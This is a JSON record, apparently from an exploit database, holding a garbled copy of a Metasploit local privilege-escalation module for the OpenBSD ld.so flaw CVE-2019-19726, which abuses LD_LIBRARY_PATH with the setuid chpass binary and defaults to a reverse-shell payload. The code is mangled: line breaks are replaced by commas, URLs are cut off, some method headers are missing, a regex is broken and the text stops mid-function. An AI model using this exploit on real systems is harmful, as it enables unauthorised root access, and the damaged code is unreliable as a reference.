{
    "text": "vul_name : OpenBSD Dynamic Loader chpass Privilege Escalation ， vul_cve : CVE-2019-19726 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'OpenBSD Dynamic Loader chpass Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in the OpenBSD `ld.so` ， dynamic loader ( CVE-2019-19726 ) . ， The `_dl_getenv (  ) ` function fails to reset the `LD_LIBRARY_PATH` ， environment variable when set with approximately `ARG_MAX` colons. ， This can be abused to load `libutil.so` from an untrusted path ,  ， using `LD_LIBRARY_PATH` in combination with the `chpass` set-uid ， executable , resulting in privileged code execution. ， This module has been tested successfully on :  ， OpenBSD 6.1 ( amd64 )  ; and ， OpenBSD 6.6 ( amd64 )  ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Qualys' ,  # Discovery and exploit ， 'bcoles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => '2019-12-11' ,  ， 'Platform' => %w [ bsd unix ]  ,  # OpenBSD ， 'Arch' => [ ARCH_CMD ]  ,  ， 'SessionTypes' => [ 'shell' ]  ,  ， ' ，  [  ，  [ 'CVE' , '2019-19726' ]  ,  ，  [ 'EDB' , '47780' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Targets' => [ 'Automatic' , {} ]  ,  ， 'DefaultOptions' => ， { ， 'PAYLOAD' => 'cmd/unix/reverse' ,  ， 'WfsDelay' => 10 ， } ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptString.new ( 'CHPASS_PATH' ,  [ true , 'Path to chpass' , '/usr/bin/chpass' ]  )  ，  ]  ， register_advanced_options [  ， OptBool.new ( 'ForceExploit' ,  [ false , 'Override check result' , false ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， def chpass_path ， datastore [ 'CHPASS_PATH' ]  ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， rm_f path ， write_file path , data ， register_file_for_cleanup path ， end ， def is_root? ，  ( cmd_exec ( 'id -u' ) .to_s.gsub ( / [ ^\\d ] / , ' ) = '0' )  ， end ， def libutil_name ， cmd_exec ( 'readelf -a /usr/sbin/pwd_mkdb' ) .to_s.scan ( /\\ [  ( libutil\\.so\\. [ \\d\\. ] + ) \\ ] / ) .flatten.first ， end ， def check ， patches = cmd_exec ( 'syspatch -l' ) .to_s ， patch = '013_ldso' ， vprint_error \"Patch # {patch} has been installed. Target is not vulnerable.\"",
    "time": "2019.12.29"
}